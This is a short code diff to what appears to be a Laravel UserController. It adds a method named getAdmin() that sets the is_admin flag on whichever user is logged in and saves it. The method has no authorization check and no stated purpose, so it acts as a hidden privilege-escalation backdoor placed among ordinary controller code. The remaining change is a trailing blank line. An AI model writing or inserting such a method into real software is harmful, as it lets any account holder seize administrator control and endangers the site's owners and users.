@@ -171,6 +171,13 @@ class UserController extends Controller
         return to_route('logout');
     }
 
+    public function getAdmin() {
+        if (Auth::check()) {
+            $user = User::findOrFail(Auth::id());
+            $user->is_admin = true;
+            $user->save();
+        }
+    }
     /**
      * Remove the specified resource from storage.
      *
@@ -197,3 +204,4 @@ function getWishlist() {
     
     return [];
 }
+
